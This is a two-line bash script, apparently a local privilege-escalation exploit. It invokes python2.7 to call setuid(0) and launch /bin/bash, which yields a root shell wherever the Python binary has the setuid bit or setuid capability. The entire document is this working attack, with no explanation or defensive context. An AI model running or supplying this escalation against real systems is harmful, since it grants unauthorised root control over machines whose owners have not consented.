#!/bin/bash

vVersPython='python2.7'

"$vVersPython" -c 'import os; os.setuid(0); os.system("/bin/bash")'

